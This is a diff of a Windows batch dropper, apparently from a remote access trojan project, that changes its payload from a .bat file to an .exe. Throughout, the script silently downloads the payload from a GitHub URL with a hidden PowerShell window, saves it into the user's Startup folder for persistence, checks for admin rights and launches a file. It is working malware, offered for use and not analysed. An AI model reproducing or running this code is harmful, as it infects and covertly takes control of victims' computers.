@@ -1,7 +1,7 @@
 @echo off
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/AuraCreate.bat"
-set "AURA_BAT_FILE=%STARTUP_FOLDER%\AuraCreate.bat"
+set "AURA_BAT_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/ArmoryCreate.exe"
+set "AURA_BAT_FILE=%STARTUP_FOLDER%\ArmoryCreate.exe"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
@@ -16,4 +16,4 @@ powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile
 start "" "%TARGET_FILE%"
 exit
 :: Made by GLICHED 
-:: v3.1
+:: v3.2
